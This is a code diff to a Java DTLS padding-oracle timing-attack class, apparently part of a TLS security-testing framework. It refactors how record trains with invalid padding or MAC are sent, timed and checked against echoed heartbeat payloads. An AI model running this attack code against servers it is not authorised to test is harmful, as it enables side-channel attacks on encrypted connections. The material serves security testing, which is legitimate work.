@@ -43,6 +43,7 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.net.SocketTimeoutException;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -92,7 +93,7 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 	    for (int i = 0; i < config.getNrOfRounds(); i++) {
 		resultBuffer[i] = executeAttackRound();
 
-		sb.append(i);
+		sb.append(i + 1);
 		sb.append(" of ");
 		sb.append(config.getNrOfRounds());
 		sb.append(" rounds.\n");
@@ -138,38 +139,63 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
     private long[] executeAttackRound() throws IOException {
 	byte[] roundMessageData = new byte[config.getTrainMessageSize()];
 	RandomHelper.getRandom().nextBytes(roundMessageData);
-	byte[][] invalidPaddingTrain = createInvalidPaddingMessageTrain(config.getMessagesPerTrain(), roundMessageData);
-	byte[][] invalidMacTrain = createInvalidMacMessageTrain(config.getMessagesPerTrain(), roundMessageData);
+	HeartbeatMessage sentHbMessage = new HeartbeatMessage();
+	sentHbMessage.getProtocolMessageHandler(tlsContext).prepareMessage();
+
+	byte[][] invalidPaddingTrain = createInvalidPaddingMessageTrain(config.getMessagesPerTrain(), roundMessageData,
+		sentHbMessage);
+	byte[][] invalidMacTrain = createInvalidMacMessageTrain(config.getMessagesPerTrain(), roundMessageData,
+		sentHbMessage);
 	long[] results = new long[2];
 
-	for (byte[] record : invalidPaddingTrain) {
-	    transportHandler.sendData(record);
-	}
-	long startNanos = System.nanoTime();
-	try {
-	    transportHandler.fetchData();
-	} catch (SocketTimeoutException e) {
-	    LOGGER.info("Receive timeout when waiting for heartbeat answer (invalid padding)");
-	}
-	long endNanos = System.nanoTime();
-	results[0] = endNanos - startNanos;
+	results[0] = handleTrain(invalidPaddingTrain, sentHbMessage.getPayload().getValue(), "Invalid Padding");
 
-	for (byte[] record : invalidMacTrain) {
-	    transportHandler.sendData(record);
-	}
-	startNanos = System.nanoTime();
-	try {
-	    transportHandler.fetchData();
-	} catch (SocketTimeoutException e) {
-	    LOGGER.info("Receive timeout when waiting for heartbeat answer (invalid MAC)");
-	}
-	endNanos = System.nanoTime();
-	results[1] = endNanos - startNanos;
+	results[1] = handleTrain(invalidMacTrain, sentHbMessage.getPayload().getValue(), "Invalid MAC");
 
 	return results;
     }
 
-    private byte[][] createInvalidPaddingMessageTrain(int n, byte[] messageData) {
+    private long handleTrain(byte[][] train, byte[] sentHeartbeatMessagePayload, String trainInfo) {
+	try {
+	    long startNanos, endNanos, result;
+
+	    for (byte[] record : train) {
+		transportHandler.sendData(record);
+	    }
+
+	    startNanos = System.nanoTime();
+	    byte[] serverAnswer = transportHandler.fetchData();
+	    endNanos = System.nanoTime();
+	    result = endNanos - startNanos;
+
+	    if (serverAnswer != null && serverAnswer.length > 1) {
+		HeartbeatMessage receivedHbMessage = new HeartbeatMessage();
+		List<de.rub.nds.tlsattacker.tls.record.messages.Record> parsedReceivedRecords = recordHandler
+			.parseRecords(serverAnswer);
+		if (parsedReceivedRecords.size() != 1) {
+		    LOGGER.info("Unexpected number of records parsed from server. Train: " + trainInfo);
+		} else {
+		    receivedHbMessage.getProtocolMessageHandler(tlsContext).parseMessage(
+			    parsedReceivedRecords.get(0).getProtocolMessageBytes().getValue(), 0);
+		    if (!Arrays.equals(receivedHbMessage.getPayload().getValue(), sentHeartbeatMessagePayload)) {
+			LOGGER.info("Heartbeat answer didn't contain the correct payload. Train: " + trainInfo);
+		    } else {
+			LOGGER.info("Correct heartbeat-payload received. Train: " + trainInfo);
+		    }
+		}
+	    } else {
+		LOGGER.info("No data from the server was received. Train: " + trainInfo);
+	    }
+	    return result;
+	} catch (SocketTimeoutException e) {
+	    LOGGER.info("Receive timeout when waiting for heartbeat answer. Train: " + trainInfo);
+	} catch (Exception e) {
+	    LOGGER.info(e.getMessage());
+	}
+	return -1;
+    }
+
+    private byte[][] createInvalidPaddingMessageTrain(int n, byte[] messageData, HeartbeatMessage heartbeatMessage) {
 	byte[][] train = new byte[n + 1][];
 	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
 	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
@@ -186,25 +212,26 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 	}
 
 	records.add(new Record());
-	HeartbeatMessage hbMessage = new HeartbeatMessage();
-	protocolMessages.add(hbMessage);
-	train[n] = recordHandler.wrapData(hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage(),
+	protocolMessages.add(heartbeatMessage);
+	train[n] = recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
 		ProtocolMessageType.HEARTBEAT, records);
 
 	return train;
     }
 
-    private byte[][] createInvalidMacMessageTrain(int n, byte[] messageData) {
+    private byte[][] createInvalidMacMessageTrain(int n, byte[] applicationMessageContent,
+	    HeartbeatMessage heartbeatMessage) {
 	byte[][] train = new byte[n + 1][];
 	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
 	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
 	protocolMessages.add(apMessage);
-	apMessage.setData(messageData);
+	apMessage.setData(applicationMessageContent);
 
 	Record record = new Record();
 	record.setMac(modifiedMacArray);
 	records.add(record);
-	byte[] recordBytes = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
+	byte[] recordBytes = recordHandler.wrapData(applicationMessageContent, ProtocolMessageType.APPLICATION_DATA,
+		records);
 
 	for (int i = 0; i < n; i++) {
 	    train[i] = recordBytes;
@@ -212,9 +239,8 @@ public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttac
 
 	records.remove(0);
 	records.add(new Record());
-	HeartbeatMessage hbMessage = new HeartbeatMessage();
-	protocolMessages.add(hbMessage);
-	train[n] = (recordHandler.wrapData(hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage(),
+	protocolMessages.add(heartbeatMessage);
+	train[n] = (recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
 		ProtocolMessageType.HEARTBEAT, records));
 
 	return train;
